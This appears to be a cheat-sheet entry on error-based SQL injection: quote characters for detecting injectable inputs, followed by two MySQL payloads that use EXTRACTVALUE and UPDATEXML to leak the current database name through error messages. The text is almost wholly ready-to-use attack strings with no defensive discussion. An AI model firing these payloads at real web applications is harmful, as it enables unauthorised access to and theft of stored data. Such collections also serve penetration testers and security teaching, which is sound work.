# Error-Based SQL Injection

## Summary
Extract data via database error messages.

## Detection
```sql
'
''
"
""
```

## Payloads (MySQL)
```sql
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))-- -
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)-- -
```
